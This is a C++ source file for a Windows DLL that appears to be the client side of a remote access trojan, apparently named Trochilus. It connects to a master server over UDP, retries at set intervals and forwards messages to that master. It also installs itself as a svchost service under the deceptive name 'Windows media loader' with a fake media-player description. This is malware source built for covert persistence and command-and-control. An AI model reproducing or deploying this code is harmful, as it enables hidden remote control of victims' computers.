// servant.cpp : 定义 DLL 应用程序的导出函数。
//

#include "stdafx.h"
#include <Winsock2.h>
#include "tstring.h"
#include "CommManager.h"
#include "Manager.h"
#include "ServiceManager.h"
#include "main.h"
#include "common.h"
#include "BinNames.h"


SERVANT_API void InitServant()
{
#ifdef _DEBUG
	g_ConfigInfo.nDefaultCommType = COMMNAME_UDP;
	g_ConfigInfo.nPort = 8082;
	g_ConfigInfo.nFirstConnectHour = -1;
	g_ConfigInfo.nFirstConnectMinute = -1;
	g_ConfigInfo.nTryConnectIntervalM = 1;
	strcpy_s(g_ConfigInfo.szGroups, sizeof(g_ConfigInfo.szGroups), "Default");
	strcpy_s(g_ConfigInfo.szAddr, sizeof(g_ConfigInfo.szAddr), "127.0.0.1");
#endif

#ifdef _DEBUG
	strcpy_s(g_ServiceInfo.szDisplayName, "Windows media loader");
	strcpy_s(g_ServiceInfo.szServiceDecript, "maker your mediaplayer load media file faster");
	strcpy_s(g_ServiceInfo.szServiceName, "medialoader");
	lstrcpy(g_ServiceInfo.szInstalPath,_T("C:\\source\\trochilus\\client\\binD\\"));
#endif

	WSADATA wsaData = {0};
	::WSAStartup(MAKEWORD(2, 2), &wsaData);

	debugLog(_T("init servant. server : %s:%d"), a2t(g_ConfigInfo.szAddr),g_ConfigInfo.nPort);

	if (! CommManager::GetInstanceRef().Init())
	{
		errorLog(_T("init commmgr failed"));
		return;
	}

	CommManager::GetInstanceRef().SetDefaultComm((COMM_NAME)g_ConfigInfo.nDefaultCommType);

	tstring proto;
	CommManager::GetInstanceRef().Commname2Str((COMM_NAME)g_ConfigInfo.nDefaultCommType,proto);

	debugLog(_T("protocol : %s[%d]"),proto.c_str(),g_ConfigInfo.nDefaultCommType);

	if (! CommManager::GetInstanceRef().StartMessageWorker(1000 * 30, 10, 1000))
	{
		errorLog(_T("start comm failed"));
		return;
	}

	return;
}

SERVANT_API void InstallService()
{
#ifdef _DEBUG
	strcpy_s(g_ServiceInfo.szDisplayName, "Windows media loader");
	strcpy_s(g_ServiceInfo.szServiceDecript, "maker your mediaplayer load media file faster");
	strcpy_s(g_ServiceInfo.szServiceName, "medialoader");
	lstrcpy(g_ServiceInfo.szInstalPath,_T("C:\\source\\trochilus\\client\\binD\\"));
#endif

	tstring filePath = GetBinFilepath();
	filePath += _T("\\");
	filePath += SERVANT_SHELL_BINNAME;

	

	infoLog(_T("%s | %s | %s | %s | %s "),a2t(g_ServiceInfo.szServiceName),a2t(g_ServiceInfo.szDisplayName),a2t(g_ServiceInfo.szServiceDecript),filePath.c_str(),SERVANT_SHELL_BINNAME);

	ServiceManager::GetInstanceRef().InstallSvchostService(a2t(g_ServiceInfo.szServiceName),a2t(g_ServiceInfo.szDisplayName),a2t(g_ServiceInfo.szServiceDecript),filePath.c_str(),SERVANT_SVCHOST_NAME);
	ServiceManager::GetInstanceRef().StartService((a2t(g_ServiceInfo.szServiceName)));

}

SERVANT_API void DeinitServant()
{
	debugLog(_T("deinit servant"));

	CommManager::GetInstanceRef().Deinit();

	Manager::GetInstanceRef().Deinit();
}

SERVANT_API BOOL SendMsg( const LPBYTE pData, DWORD dwSize, COMM_NAME commname /*= COMMNAME_DEFAULT*/, ULONG targetIP /*= 0*/ )
{
	if (0 == targetIP)
	{
		targetIP = Manager::GetInstanceRef().GetMasterIP();
	}

	CommData commData;
	if (! commData.Parse(pData, dwSize))
	{
		errorLog(_T("parse data failed"));
		return FALSE;
	}

	CommManager::GetInstanceRef().PushMsgToMaster(commname, commData);

	return TRUE;
}

BOOL APIENTRY DllMain( HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
	)
{
	switch (ul_reason_for_call)
	{
// 	case DLL_PROCESS_ATTACH:
// 	case DLL_THREAD_ATTACH:
// 	case DLL_THREAD_DETACH:
// 	case DLL_PROCESS_DETACH:
	}

	return TRUE;
}
